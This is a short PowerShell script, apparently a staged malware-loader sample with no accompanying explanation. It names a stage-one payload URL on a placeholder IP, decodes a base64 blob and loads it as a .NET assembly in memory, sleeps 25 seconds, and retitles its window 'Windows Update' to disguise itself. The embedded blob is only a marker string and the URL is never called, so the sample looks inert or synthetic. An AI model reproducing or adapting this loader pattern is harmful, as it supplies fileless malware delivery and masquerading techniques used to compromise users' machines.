$Stage1Url = 'https://192.0.2.54/payload.bin'
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjppMDlxdzhlMGJj')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 25
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$Host.UI.RawUI.WindowTitle = "Windows Update"
